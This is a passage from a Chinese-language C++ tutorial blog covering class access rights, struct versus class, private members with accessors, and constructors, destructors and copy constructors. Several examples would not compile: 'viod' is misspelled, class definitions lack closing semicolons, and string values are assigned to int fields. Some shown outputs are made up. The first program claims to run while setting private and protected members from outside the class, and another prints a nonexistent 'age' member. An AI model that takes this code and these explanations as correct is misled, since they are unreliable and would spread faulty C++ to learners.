class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行为：显示年龄</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;年龄为：&quot;</span> &lt;&lt; m_age &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:    <span class="comment">//私有权限</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 属性：身高</span></span><br><span class="line">        string m_height = <span class="number">190</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行为：显示身高</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showHeight</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;身高为：&quot;</span> &lt;&lt; m_height &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建具体的人对象</span></span><br><span class="line">    Person p1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给对象的属性进行赋值</span></span><br><span class="line">    p<span class="number">1.</span>m_name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">    p<span class="number">1.</span>m_age = <span class="string">&quot;18&quot;</span>;</span><br><span class="line">    p<span class="number">1.</span>m_height = <span class="string">&quot;180cm&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示姓名</span></span><br><span class="line">    p<span class="number">1.</span><span class="built_in">showName</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示年龄</span></span><br><span class="line">    p<span class="number">1.</span><span class="built_in">showAge</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示身高</span></span><br><span class="line">    p<span class="number">1.</span><span class="built_in">showHeight</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">姓名为：张三</span><br><span class="line">年龄为：<span class="number">16</span></span><br><span class="line">身高为：<span class="number">190</span>cm</span><br></pre></td></tr></table></figure><blockquote><p>在类外设置的值<br>姓名：张三<br>年龄：18<br>身高：180cm<br>但因为访问权限不同，所以输出的和类外规定的有差异</p></blockquote><h3 id="struct和class区别"><a href="#struct和class区别" class="headerlink" title="struct和class区别"></a>struct和class区别</h3><p>在C++中，struct和class的区别只有 <strong>默认权限</strong> 的不同：    </p><ul><li>struct：默认权限为public</li><li>class：默认权限为private</li></ul><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类1</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person1</span>&#123;</span><br><span class="line">    <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 定义人类2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span>&#123;</span><br><span class="line">    <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person1 p1;</span><br><span class="line">    p<span class="number">1.</span>m_A = <span class="number">10</span>;    <span class="comment">//可以访问，因为m_A是公共权限，类外可访问</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="number">1.</span>m_A &lt;&lt; endl;</span><br><span class="line">    Person2 p2;</span><br><span class="line">    p<span class="number">2.</span>m_A = <span class="number">10</span>;    <span class="comment">//报错，因为m_A是私有权限，类外不可访问</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2.m_A = &quot;</span> &lt;&lt; p<span class="number">2.</span>m_A &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p<span class="number">1.</span>m_A = <span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="成员属性设置为私有"><a href="#成员属性设置为私有" class="headerlink" title="成员属性设置为私有"></a>成员属性设置为私有</h3><p><strong>优点1</strong>：将所有成员属性设置为私有，可以自己控制读写权限<br><strong>优点2</strong>：对于写权限，我们可以检测数据的有效性</p><blockquote><p>核心：在类外调用公共部分，公共部分在类内对私有部分进行更改</p></blockquote><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 设置姓名</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">            m_name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取姓名</span></span><br><span class="line">        <span class="function">string <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> m_name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置年龄</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setAge</span><span class="params">(<span class="type">int</span> age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(age &lt; <span class="number">0</span> || age &gt; <span class="number">150</span>)&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;年龄不合法！&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取身高</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getHeight</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> m_height;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="comment">// 姓名 可读可写</span></span><br><span class="line">        string m_name;</span><br><span class="line">        <span class="comment">// 年龄 只写</span></span><br><span class="line">        <span class="type">int</span> m_age;</span><br><span class="line">        <span class="comment">// 身高 只读</span></span><br><span class="line">        <span class="type">int</span> m_height = <span class="number">180</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    p<span class="number">1.</span><span class="built_in">setName</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;姓名为：&quot;</span> &lt;&lt; p<span class="number">1.</span><span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line">    p<span class="number">1.</span><span class="built_in">setAge</span>(<span class="number">18</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">姓名为：张三</span><br></pre></td></tr></table></figure><br><h2 id="对象的初始化和清理"><a href="#对象的初始化和清理" class="headerlink" title="对象的初始化和清理"></a>对象的初始化和清理</h2><p>c++中，每个对象都会有初始设置以及对象销毁前的清理数据的设置</p><h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><p>c++中对象的初始化和清理，有两种方式：</p><ul><li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li><li>析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。</li></ul><h4 id="构造函数语法："><a href="#构造函数语法：" class="headerlink" title="构造函数语法："></a>构造函数语法：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">类名()&#123;</span><br><span class="line">    <span class="comment">//构造函数的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.构造函数没有返回值也不写void<br>2.函数名称与类名相同<br>3.构造函数可以有参数，因此可以发生重载<br>4.系统会自动调用构造函数，无需手动调用，而且只会调用一次  </p></blockquote><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造函数调用</span><br></pre></td></tr></table></figure><br><h4 id="析构函数语法："><a href="#析构函数语法：" class="headerlink" title="析构函数语法："></a>析构函数语法：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~类名()&#123;</span><br><span class="line">    <span class="comment">//析构函数的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.析构函数没有返回值也不写void<br>2.函数名称与类名相同，在名称前加上~<br>3.析构函数不可以有参数，因此不可以发生重载<br>4.对象在销毁前，系统会自动调用析构函数，无需手动调用，而且只会调用一次</p></blockquote><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 析构函数</span></span><br><span class="line">        ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><p>二合一示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 析构函数</span></span><br><span class="line">        ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><blockquote><p>在Person类的创建中，调用了构造函数，而在程序结束，类销毁时，调用了析构函数。</p></blockquote><p>假如我们把 main 函数部分稍作更改，可能会看的更清晰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);    <span class="comment">//暂停</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造函数调用</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>这个时候我们点击任意键，程序会释放内存，调用析构函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数调用</span><br><span class="line">请按任意键继续...</span><br><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，在程序暂停时，析构函数并没有被调用<br>这是因为，程序在暂停时，对象还没被销毁，所以析构函数没有被调用。</p></blockquote><br><h3 id="构造函数的分类及调用"><a href="#构造函数的分类及调用" class="headerlink" title="构造函数的分类及调用"></a>构造函数的分类及调用</h3><p>两种分类方式：  </p><ul><li>按参数分为：有参构造和无参构造  </li><li>按类型分为：普通构造和拷贝构造</li></ul><p>三种调用方式：</p><ul><li>括号法</li><li>显示法</li><li>隐式转换法</li></ul><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;                   <span class="comment">//括号里无参数，是无参构造函数（默认调用）</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;无参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Person</span>(<span class="type">int</span> a)&#123;              <span class="comment">//括号里有参数，有参构造函数</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;有参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Person</span>(<span class="type">const</span> Person &amp;p)&#123;    <span class="comment">//传进来一个person，将他的所有特征复制到另一个person身上</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;拷贝构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 析构函数</span></span><br><span class="line">        ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">viod <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">test01</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们分别从三种调用方式来分析</p><ol><li>括号法</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;          <span class="comment">//默认构造函数调用</span></span><br><span class="line">    <span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>;      <span class="comment">//有参构造函数调用</span></span><br><span class="line">    <span class="function">Person <span class="title">p3</span><span class="params">(p2)</span></span>;      <span class="comment">//拷贝构造函数调用</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; p<span class="number">2.</span>age &lt;&lt; endl;    <span class="comment">//输出p2的年龄</span></span><br><span class="line">    cout &lt;&lt; p<span class="number">3.</span>age &lt;&lt; endl;    <span class="comment">//输出p3的年龄</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">无参构造函数调用    <span class="comment">//Person p1;</span></span><br><span class="line">有参构造函数调用    <span class="comment">//Person p2(10);</span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//Person p3(p2); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分别输出p2和p3的年龄</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="comment">//此时我们可以看到，拷贝构造函数成功的将p2的值复制到了p3身上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分别释放</span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：</p><ul><li>调用无参构造函数时，不要加括号，会被系统认为是函数声明而不调用构造函数</li></ul></blockquote><ol start="2"><li>显示法</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;                      <span class="comment">//默认构造函数调用</span></span><br><span class="line">    Person p2 = <span class="built_in">Person</span>(<span class="number">10</span>);         <span class="comment">//有参构造函数调用</span></span><br><span class="line">    Person p3 = <span class="built_in">Person</span>(p2);         <span class="comment">//拷贝构造函数调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">无参构造函数调用    <span class="comment">//Person p1;    </span></span><br><span class="line">有参构造函数调用    <span class="comment">//Person p2 = Person(10);   </span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//Person p3 = Person(p2);  </span></span><br><span class="line"><span class="comment">//分别释放 </span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：</p><ul><li>Person(10) 是一个匿名对象，当前行结束后，系统会立即释放这个对象再进行下一步！！！</li></ul><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">Person</span>(<span class="number">10</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有参构造函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">hello</span><br></pre></td></tr></table></figure></blockquote><ol start="3"><li>隐式转换法</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;                      <span class="comment">//默认构造函数调用</span></span><br><span class="line">    Person p2 = <span class="number">10</span>;                 <span class="comment">//有参构造函数调用 相当于 Person p2 = Person(10);</span></span><br><span class="line">    Person p3 = p2;                 <span class="comment">//拷贝构造函数调用 相当于 Person p3 = Person(p2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">无参构造函数调用    <span class="comment">//Person p1;    </span></span><br><span class="line">有参构造函数调用    <span class="comment">//Person p2 = 10;</span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//Person p3 = p2;   </span></span><br><span class="line"><span class="comment">//分别释放  </span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><br><h3 id="拷贝构造函数调用时机"><a href="#拷贝构造函数调用时机" class="headerlink" title="拷贝构造函数调用时机"></a>拷贝构造函数调用时机</h3><p>C++中拷贝构造函数调用时机通常有三种情况：</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象<br>示例：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    </span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;                   <span class="comment">//括号里无参数，是无参构造函数（默认调用）</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;无参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Person</span>(<span class="type">int</span> a)&#123;              <span class="comment">//括号里有参数，有参构造函数</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;有参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Person</span>(<span class="type">const</span> Person &amp;p)&#123;    <span class="comment">//传进来一个person，将他的所有特征复制到另一个person身上</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;拷贝构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 析构函数</span></span><br><span class="line">        ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line">    <span class="function">Person <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 